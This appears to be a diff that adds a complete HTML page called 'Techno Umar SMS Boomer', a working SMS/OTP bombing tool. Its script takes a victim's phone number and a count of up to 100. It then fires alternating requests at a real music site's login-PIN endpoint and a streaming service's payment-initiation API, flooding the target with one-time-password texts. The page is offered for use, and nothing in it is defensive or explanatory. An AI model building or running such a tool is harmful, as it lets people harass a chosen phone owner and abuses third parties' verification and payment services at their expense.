@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Techno Umar SMS Boomer</title>
+    <link rel="icon" href="./fampng/faheem.png" type="image/png"> 
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        input, button {
+            margin: 10px;
+            padding: 12px;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            outline: none;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+            transition: all 0.3s ease-in-out;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        input:focus, button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+        }
+
+        button {
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        #status {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #0ff;
+            text-shadow: 0 0 10px #0ff;
+        }
+    </style>
+    <script>
+        async function sendOTP() {
+            let phone = document.getElementById('phone').value;
+            let count = parseInt(document.getElementById('count').value);
+
+            if (!phone || !count || count < 1 || count > 100) {
+                alert('Please enter a valid phone number and OTP count (1-100).');
+                return;
+            }
+
+            document.getElementById('status').innerText = 'Sending OTPs...';
+
+            let completed = 0;
+
+            for (let i = 0; i < count; i++) {
+                let apiUrl = i % 2 === 0 ? 
+                    `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}` : 
+                    `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`;
+
+                let payload = i % 2 !== 0 ? JSON.stringify({
+                    Version: 'V1',
+                    Language: 'en',
+                    Platform: 'web',
+                    ProductId: 1733,
+                    MobileNo: phone,
+                    OperatorId: '100007',
+                    URL: 'https://www.tapmad.com/sign-up',
+                    source: 'organic',
+                    medium: 'organic'
+                }) : null;
+
+                let options = {
+                    method: 'POST',
+                    headers: i % 2 !== 0 ? {
+                        'Content-Type': 'application/json',
+                        'accept': 'application/json'
+                    } : {},
+                    body: payload
+                };
+
+                fetch(apiUrl, options)
+                    .finally(() => {
+                        completed++;
+                        if (completed === count) {
+                            document.getElementById('status').innerText = 'OTP(s) sent successfully!';
+                        }
+                    });
+            }
+        }
+    </script>
+</head>
+<body>
+    <h2 style="text-shadow: 0 0 20px cyan;">Techno Umar SMS Boomer</h2>
+    <input type="text" id="phone" placeholder="Enter number 923xx" required>
+    <input type="number" id="count" placeholder="Enter OTP count (1-100)" required>
+    <button onclick="sendOTP()">Send OTP</button>
+    <p id="status"></p>
+</body>
+</html>
